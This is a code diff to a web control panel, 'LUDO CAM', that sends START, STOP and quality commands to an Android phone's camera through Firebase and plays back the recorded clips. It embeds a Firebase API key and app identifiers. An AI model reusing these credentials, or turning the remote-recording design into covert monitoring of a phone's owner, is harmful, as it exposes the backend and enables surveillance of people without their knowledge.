@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>LUDO CAM - LIVE CONTROL</title>
+    <title>LUDO CAM - LIVE</title>
     <style>
         * {
             margin: 0;
@@ -209,6 +209,9 @@
             position: relative;
             aspect-ratio: 16 / 9;
             background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         .video-wrapper video {
@@ -229,11 +232,13 @@
             font-family: monospace;
         }
 
-        .loader {
+        .waiting-message {
+            position: absolute;
+            color: #666;
+            font-size: 14px;
+            font-family: monospace;
             text-align: center;
-            padding: 20px;
-            color: #888;
-            font-size: 12px;
+            z-index: 10;
         }
 
         .footer {
@@ -245,7 +250,7 @@
         }
 
         .hidden {
-            display: none;
+            display: none !important;
         }
 
         .toast {
@@ -298,7 +303,8 @@
 
     <div class="video-section">
         <div class="video-wrapper">
-            <video id="liveVideo" autoplay muted playsinline disablePictureInPicture></video>
+            <div class="waiting-message" id="waitingMessage">⏳ Waiting for live stream...</div>
+            <video id="liveVideo" muted playsinline disablePictureInPicture style="display: none;"></video>
             <div class="video-label">📡 LIVE STREAM</div>
         </div>
     </div>
@@ -315,7 +321,7 @@
 
 <script>
     // ============================================================
-    // FIREBASE CONFIGURATION (From google-services.json)
+    // FIREBASE CONFIGURATION
     // ============================================================
     const firebaseConfig = {
         apiKey: "AIzaSyBwDAhUS8iqNsM5rMewtwFnQs-s3FcnaoU",
@@ -326,7 +332,6 @@
         appId: "1:315485454659:android:e5d69c3b9a1a87854c2ff6"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
     const dbRef = database.ref('ludo_cam');
@@ -336,9 +341,12 @@
     // ============================================================
     let currentDeviceId = null;
     let isRecordingActive = false;
+    let isLiveActive = false;  // 🔥 NEW: Website live status
     let videoQueue = [];
     let currentVideoUrl = null;
     let isPlaying = false;
+    let pollingInterval = null;
+    let waitingForNextVideo = false;
 
     // DOM Elements
     const statusDot = document.getElementById('statusDot');
@@ -349,6 +357,7 @@
     const stopBtn = document.getElementById('stopBtn');
     const qualitySelect = document.getElementById('qualitySelect');
     const liveVideo = document.getElementById('liveVideo');
+    const waitingMessage = document.getElementById('waitingMessage');
 
     // ============================================================
     // TOAST NOTIFICATION
@@ -378,11 +387,9 @@
                 statusText.innerText = 'No device found';
                 statusDot.className = 'status-dot offline';
                 deviceNameSpan.innerText = 'No Android device connected';
-                showToast('❌ No Android device found! Please install and open the app.', true);
                 return null;
             }
             
-            // Find first online device
             for (const [deviceId, device] of Object.entries(devices)) {
                 if (device.online === true) {
                     currentDeviceId = deviceId;
@@ -390,35 +397,28 @@
                     statusText.innerText = '🟢 ONLINE';
                     deviceNameSpan.innerText = `📱 ${device.deviceName || 'Camera'}`;
                     
-                    // Update recording status
                     isRecordingActive = device.recording === true;
                     updateRecordingUI();
                     
-                    // Enable controls
                     startBtn.disabled = false;
                     stopBtn.disabled = false;
                     qualitySelect.disabled = false;
                     
                     showToast(`✅ Connected to ${device.deviceName || 'Camera'}`);
-                    
-                    // Listen for real-time updates
                     listenToDeviceStatus(deviceId);
                     
                     return deviceId;
                 }
             }
             
-            // No online device found
             statusText.innerText = 'Device offline';
             statusDot.className = 'status-dot offline';
             deviceNameSpan.innerText = 'App is closed or offline';
-            showToast('❌ Device is offline! Please open the Android app.', true);
             return null;
             
         } catch (error) {
-            console.error('Error finding device:', error);
+            console.error('Error:', error);
             statusText.innerText = 'Error connecting';
-            showToast('❌ Firebase connection error!', true);
             return null;
         }
     }
@@ -433,12 +433,18 @@
                 isRecordingActive = device.recording === true;
                 updateRecordingUI();
                 
+                // 🔥 If recording stopped, also stop live view
+                if (!isRecordingActive && isLiveActive) {
+                    stopLiveView();
+                }
+                
                 if (device.online !== true) {
                     statusDot.className = 'status-dot offline';
                     statusText.innerText = 'Device offline';
                     startBtn.disabled = true;
                     stopBtn.disabled = true;
                     qualitySelect.disabled = true;
+                    stopLiveView();
                 } else {
                     statusDot.className = 'status-dot online';
                     statusText.innerText = '🟢 ONLINE';
@@ -464,7 +470,64 @@
     }
 
     // ============================================================
-    // SEND START COMMAND
+    // START LIVE VIEW
+    // ============================================================
+    function startLiveView() {
+        if (isLiveActive) return;
+        
+        isLiveActive = true;
+        waitingMessage.classList.add('hidden');
+        liveVideo.style.display = 'block';
+        
+        // Clear old queue
+        videoQueue = [];
+        currentVideoUrl = null;
+        isPlaying = false;
+        waitingForNextVideo = false;
+        
+        // Start fetching videos
+        fetchLatestVideos();
+        
+        // Start polling every 3 seconds
+        if (pollingInterval) clearInterval(pollingInterval);
+        pollingInterval = setInterval(fetchLatestVideos, 3000);
+        
+        showToast('🔴 LIVE stream started');
+    }
+
+    // ============================================================
+    // STOP LIVE VIEW - 🔥 NO REPEAT, JUST STOPS!
+    // ============================================================
+    function stopLiveView() {
+        if (!isLiveActive) return;
+        
+        isLiveActive = false;
+        
+        // Stop video playback
+        liveVideo.pause();
+        liveVideo.src = '';
+        liveVideo.style.display = 'none';
+        
+        // Clear queue
+        videoQueue = [];
+        currentVideoUrl = null;
+        isPlaying = false;
+        waitingForNextVideo = false;
+        
+        // Stop polling
+        if (pollingInterval) {
+            clearInterval(pollingInterval);
+            pollingInterval = null;
+        }
+        
+        // Show waiting message
+        waitingMessage.classList.remove('hidden');
+        
+        showToast('⏹ LIVE stream stopped');
+    }
+
+    // ============================================================
+    // SEND START COMMAND TO ANDROID
     // ============================================================
     window.sendStartCommand = async function() {
         if (!currentDeviceId) {
@@ -477,9 +540,11 @@
         
         try {
             await dbRef.child(`commands/${currentDeviceId}/control`).set('START');
-            showToast('✅ Start command sent! Recording will begin...');
+            showToast('✅ Start command sent!');
+            // Start live view immediately
+            startLiveView();
         } catch (error) {
-            showToast('❌ Failed to send command: ' + error.message, true);
+            showToast('❌ Failed: ' + error.message, true);
         }
         
         setTimeout(() => {
@@ -489,7 +554,7 @@
     };
 
     // ============================================================
-    // SEND STOP COMMAND
+    // SEND STOP COMMAND TO ANDROID
     // ============================================================
     window.sendStopCommand = async function() {
         if (!currentDeviceId) {
@@ -502,9 +567,11 @@
         
         try {
             await dbRef.child(`commands/${currentDeviceId}/control`).set('STOP');
-            showToast('⏹ Stop command sent! Recording will stop.');
+            showToast('⏹ Stop command sent!');
+            // Stop live view immediately
+            stopLiveView();
         } catch (error) {
-            showToast('❌ Failed to send command: ' + error.message, true);
+            showToast('❌ Failed: ' + error.message, true);
         }
         
         setTimeout(() => {
@@ -518,9 +585,7 @@
     // ============================================================
     window.sendQualityCommand = async function() {
         if (!currentDeviceId) return;
-        
         const quality = qualitySelect.value;
-        
         try {
             await dbRef.child(`commands/${currentDeviceId}/quality`).set(quality);
             showToast(`🎥 Quality changed to ${quality}`);
@@ -533,24 +598,43 @@
     // FETCH LATEST VIDEOS FROM API
     // ============================================================
     async function fetchLatestVideos() {
+        if (!isLiveActive) return;
+        
         try {
             const response = await fetch('/api/photos');
             const data = await response.json();
             
             if (data.success && data.videos && data.videos.length > 0) {
-                for (const video of data.videos) {
-                    if (video.url !== currentVideoUrl) {
-                        currentVideoUrl = video.url;
-                        videoQueue.push(video.url);
+                // Get the latest video
+                const latestVideo = data.videos[0];
+                
+                // 🔥 Only add if it's a NEW video (not the one currently playing)
+                if (latestVideo.url !== currentVideoUrl) {
+                    currentVideoUrl = latestVideo.url;
+                    
+                    // Clear queue and add only the latest
+                    videoQueue = [latestVideo.url];
+                    
+                    // If not playing, play now
+                    if (!isPlaying) {
+                        playVideo(latestVideo.url);
                     }
+                    
+                    waitingForNextVideo = false;
                 }
-                
-                if (videoQueue.length > 3) {
-                    videoQueue = videoQueue.slice(-3);
-                }
-                
-                if (!isPlaying && videoQueue.length > 0) {
-                    playNextVideo();
+            } else {
+                // 🔥 No video available - freeze/stop, don't repeat
+                if (!waitingForNextVideo) {
+                    waitingForNextVideo = true;
+                    
+                    // If currently playing, stop it
+                    if (isPlaying) {
+                        liveVideo.pause();
+                        isPlaying = false;
+                    }
+                    
+                    waitingMessage.classList.remove('hidden');
+                    liveVideo.style.display = 'none';
                 }
             }
         } catch (error) {
@@ -559,35 +643,57 @@
     }
 
     // ============================================================
-    // PLAY NEXT VIDEO (Seamless)
+    // PLAY VIDEO (Single video, no repeat)
     // ============================================================
-    function playNextVideo() {
-        if (videoQueue.length === 0) return;
+    function playVideo(videoUrl) {
+        if (!isLiveActive) return;
         
-        const nextUrl = videoQueue.shift();
+        waitingMessage.classList.add('hidden');
+        liveVideo.style.display = 'block';
         
         liveVideo.style.transition = 'opacity 0.3s ease';
         liveVideo.style.opacity = '0';
         
         setTimeout(() => {
-            liveVideo.src = nextUrl;
+            liveVideo.src = videoUrl;
             liveVideo.load();
-            liveVideo.play().catch(e => console.log('Autoplay blocked:', e));
-            liveVideo.style.opacity = '1';
-            isPlaying = true;
             
-            setTimeout(() => {
-                liveVideo.style.transition = '';
-            }, 300);
+            const playPromise = liveVideo.play();
+            if (playPromise !== undefined) {
+                playPromise.then(() => {
+                    isPlaying = true;
+                    liveVideo.style.opacity = '1';
+                    liveVideo.style.transition = '';
+                }).catch(e => {
+                    console.log('Play error:', e);
+                    isPlaying = false;
+                });
+            }
         }, 100);
     }
 
+    // ============================================================
+    // 🔥 WHEN VIDEO ENDS - JUST STOP, NO REPEAT!
+    // ============================================================
     liveVideo.addEventListener('ended', () => {
         isPlaying = false;
-        if (videoQueue.length > 0) {
-            playNextVideo();
-        } else {
-            setTimeout(fetchLatestVideos, 1000);
+        
+        // Check if there's a new video waiting
+        if (videoQueue.length > 0 && isLiveActive) {
+            const nextUrl = videoQueue.shift();
+            if (nextUrl !== currentVideoUrl) {
+                currentVideoUrl = nextUrl;
+                playVideo(nextUrl);
+            } else {
+                // Same video - don't repeat, just wait for new
+                waitingMessage.classList.remove('hidden');
+                liveVideo.style.display = 'none';
+            }
+        } else if (isLiveActive) {
+            // No new video - show waiting message, don't repeat
+            waitingMessage.classList.remove('hidden');
+            liveVideo.style.display = 'none';
+            waitingForNextVideo = true;
         }
     });
 
@@ -596,20 +702,13 @@
     // ============================================================
     async function init() {
         await findActiveDevice();
-        fetchLatestVideos();
         
-        // Poll for device status every 5 seconds (fallback)
-        setInterval(async () => {
-            if (!currentDeviceId) {
-                await findActiveDevice();
-            }
-        }, 5000);
-        
-        // Poll for videos every 3 seconds
-        setInterval(fetchLatestVideos, 3000);
+        // Check initial recording status
+        if (isRecordingActive && !isLiveActive) {
+            startLiveView();
+        }
     }
     
-    // Start the app
     init();
     
     // Attach button events
